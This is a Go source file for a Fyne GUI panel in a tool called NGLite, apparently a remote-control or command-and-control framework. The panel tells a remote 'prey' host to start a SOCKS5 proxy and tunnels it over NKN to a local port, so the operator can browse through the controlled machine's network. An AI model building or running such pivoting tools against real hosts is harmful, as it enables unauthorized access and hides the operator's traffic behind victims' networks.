package widgets

import (
	"NGLite/internal/core"
	"NGLite/internal/socks5"
	"NGLite/internal/transport"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"strconv"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
)

type Socks5PanelWidget struct {
	widget.BaseWidget

	session      *core.Session
	dispatcher   *core.CommandDispatcher
	socks5Mgr    *socks5.Manager
	transportMgr *transport.TransportManager
	window       fyne.Window

	statusLabel    *widget.Label
	localPortEntry *widget.Entry
	startBtn       *widget.Button
	stopBtn        *widget.Button
	logText        *widget.Entry
}

func NewSocks5PanelWidget(dispatcher *core.CommandDispatcher, socks5Mgr *socks5.Manager, transportMgr *transport.TransportManager, window fyne.Window) *Socks5PanelWidget {
	w := &Socks5PanelWidget{
		dispatcher:   dispatcher,
		socks5Mgr:    socks5Mgr,
		transportMgr: transportMgr,
		window:       window,
	}
	w.ExtendBaseWidget(w)
	return w
}

func (w *Socks5PanelWidget) CreateRenderer() fyne.WidgetRenderer {
	w.statusLabel = widget.NewLabel("状态: 未启动")

	w.localPortEntry = widget.NewEntry()
	w.localPortEntry.SetPlaceHolder("本地端口 (默认: 1080)")
	w.localPortEntry.SetText("1080")

	w.startBtn = widget.NewButtonWithIcon("启动代理", theme.MediaPlayIcon(), w.onStart)
	w.startBtn.Disable()

	w.stopBtn = widget.NewButtonWithIcon("停止代理", theme.MediaStopIcon(), w.onStop)
	w.stopBtn.Disable()

	w.logText = widget.NewMultiLineEntry()
	w.logText.SetPlaceHolder("代理日志...")
	w.logText.Disable()

	infoLabel := widget.NewLabel("SOCKS5 代理说明：\n" +
		"1. 选择左侧在线会话\n" +
		"2. 设置本地端口（默认1080）\n" +
		"3. 点击「启动代理」\n" +
		"4. 在浏览器中配置 SOCKS5 代理 127.0.0.1:端口\n" +
		"5. 即可通过被控端网络上网")
	infoLabel.Wrapping = fyne.TextWrapWord

	portForm := container.NewBorder(
		nil,
		nil,
		widget.NewLabel("本地端口:"),
		nil,
		w.localPortEntry,
	)

	buttonBox := container.NewHBox(
		w.startBtn,
		w.stopBtn,
	)

	content := container.NewBorder(
		container.NewVBox(
			widget.NewLabel("SOCKS5 代理控制"),
			widget.NewSeparator(),
			w.statusLabel,
			portForm,
			buttonBox,
			widget.NewSeparator(),
			infoLabel,
			widget.NewSeparator(),
			widget.NewLabel("日志输出:"),
		),
		nil,
		nil,
		nil,
		container.NewScroll(w.logText),
	)

	return widget.NewSimpleRenderer(content)
}

func (w *Socks5PanelWidget) SetSession(session *core.Session) {
	w.session = session

	// Check if tunnel already exists for this session
	if _, exists := w.socks5Mgr.GetTunnel(session.PreyID); exists {
		w.statusLabel.SetText("状态: ● 代理运行中")
		w.startBtn.Disable()
		w.stopBtn.Enable()
		w.addLog(fmt.Sprintf("已连接到会话: %s", session.PreyID))
	} else {
		w.statusLabel.SetText("状态: 未启动")
		w.startBtn.Enable()
		w.stopBtn.Disable()
		w.addLog(fmt.Sprintf("选择会话: %s (%s)", session.PreyID, session.IP))
	}
}

func (w *Socks5PanelWidget) onStart() {
	if w.session == nil {
		dialog.ShowError(fmt.Errorf("请先选择一个在线会话"), w.window)
		return
	}

	// Get local port
	portStr := w.localPortEntry.Text
	if portStr == "" {
		portStr = "1080"
	}
	port, err := strconv.Atoi(portStr)
	if err != nil || port < 1 || port > 65535 {
		dialog.ShowError(fmt.Errorf("无效的端口号: %s", portStr), w.window)
		return
	}

	localAddr := fmt.Sprintf("127.0.0.1:%d", port)

	w.startBtn.Disable()
	w.statusLabel.SetText("状态: 正在启动...")
	w.addLog("正在向被控端发送启动SOCKS5命令...")

	go func() {
		// Send start command to prey
		result, err := w.dispatcher.StartSocks5(w.session.PreyID, "")
		if err != nil {
			w.statusLabel.SetText("状态: 启动失败")
			w.addLog(fmt.Sprintf("错误: %v", err))
			w.startBtn.Enable()
			dialog.ShowError(err, w.window)
			return
		}

		// Parse result
		var jsonResult map[string]interface{}
		if err := json.Unmarshal([]byte(result), &jsonResult); err != nil {
			w.statusLabel.SetText("状态: 启动失败")
			w.addLog(fmt.Sprintf("解析响应失败: %v", err))
			w.startBtn.Enable()
			dialog.ShowError(err, w.window)
			return
		}

		if success, ok := jsonResult["success"].(bool); !ok || !success {
			errMsg := "未知错误"
			if msg, ok := jsonResult["error"].(string); ok {
				errMsg = msg
			}
			w.statusLabel.SetText("状态: 启动失败")
			w.addLog(fmt.Sprintf("被控端启动失败: %s", errMsg))
			w.startBtn.Enable()
			dialog.ShowError(fmt.Errorf(errMsg), w.window)
			return
		}

		nknAddr, _ := jsonResult["nkn_addr"].(string)
		identifier, _ := jsonResult["identifier"].(string)

		w.addLog(fmt.Sprintf("被控端SOCKS5已启动"))
		w.addLog(fmt.Sprintf("NKN标识: %s", identifier))
		w.addLog(fmt.Sprintf("NKN地址: %s", nknAddr))
		w.addLog(fmt.Sprintf("正在创建本地隧道: %s", localAddr))

		// Generate hunter identifier
		hunterIdentifier := fmt.Sprintf("hunter_%s", generateRandomID())

		tunnel, err := socks5.NewTunnel(
			w.transportMgr.GetAccount(),
			hunterIdentifier,
			localAddr,
			nknAddr,
			4,
		)
		if err != nil {
			w.statusLabel.SetText("状态: 启动失败")
			w.addLog(fmt.Sprintf("创建隧道失败: %v", err))
			w.startBtn.Enable()
			dialog.ShowError(err, w.window)
			// Stop prey side
			w.dispatcher.StopSocks5(w.session.PreyID)
			return
		}

		// Start tunnel
		if err := w.socks5Mgr.StartTunnel(w.session.PreyID, tunnel); err != nil {
			w.statusLabel.SetText("状态: 启动失败")
			w.addLog(fmt.Sprintf("启动隧道失败: %v", err))
			w.startBtn.Enable()
			dialog.ShowError(err, w.window)
			tunnel.Close()
			w.dispatcher.StopSocks5(w.session.PreyID)
			return
		}

		w.statusLabel.SetText(fmt.Sprintf("状态: ● 代理运行中 (127.0.0.1:%d)", port))
		w.addLog(fmt.Sprintf("✓ SOCKS5代理已启动: %s", localAddr))
		w.addLog("请在浏览器中配置SOCKS5代理:")
		w.addLog(fmt.Sprintf("  地址: 127.0.0.1"))
		w.addLog(fmt.Sprintf("  端口: %d", port))
		w.stopBtn.Enable()

		dialog.ShowInformation("成功",
			fmt.Sprintf("SOCKS5代理已启动！\n\n代理地址: 127.0.0.1:%d\n\n请在浏览器中配置SOCKS5代理", port),
			w.window)
	}()
}

func (w *Socks5PanelWidget) onStop() {
	if w.session == nil {
		return
	}

	w.stopBtn.Disable()
	w.statusLabel.SetText("状态: 正在停止...")
	w.addLog("正在停止代理...")

	go func() {
		// Stop local tunnel
		if err := w.socks5Mgr.StopTunnel(w.session.PreyID); err != nil {
			w.addLog(fmt.Sprintf("停止隧道失败: %v", err))
		} else {
			w.addLog("本地隧道已停止")
		}

		// Stop prey side
		result, err := w.dispatcher.StopSocks5(w.session.PreyID)
		if err != nil {
			w.addLog(fmt.Sprintf("停止被控端失败: %v", err))
		} else {
			w.addLog("被控端SOCKS5已停止")
			w.addLog(fmt.Sprintf("响应: %s", result))
		}

		w.statusLabel.SetText("状态: 已停止")
		w.addLog("✓ SOCKS5代理已完全停止")
		w.startBtn.Enable()
	}()
}

func (w *Socks5PanelWidget) addLog(msg string) {
	current := w.logText.Text
	if current != "" {
		current += "\n"
	}
	current += fmt.Sprintf("[%s] %s", getCurrentTime(), msg)
	w.logText.SetText(current)

	// Auto scroll to bottom (hack by setting cursor to end)
	w.logText.CursorRow = len(w.logText.Text)
}

func generateRandomID() string {
	hash := md5.Sum([]byte(fmt.Sprintf("%d", time.Now().UnixNano())))
	return hex.EncodeToString(hash[:8])
}

func getCurrentTime() string {
	now := time.Now()
	return now.Format("15:04:05")
}
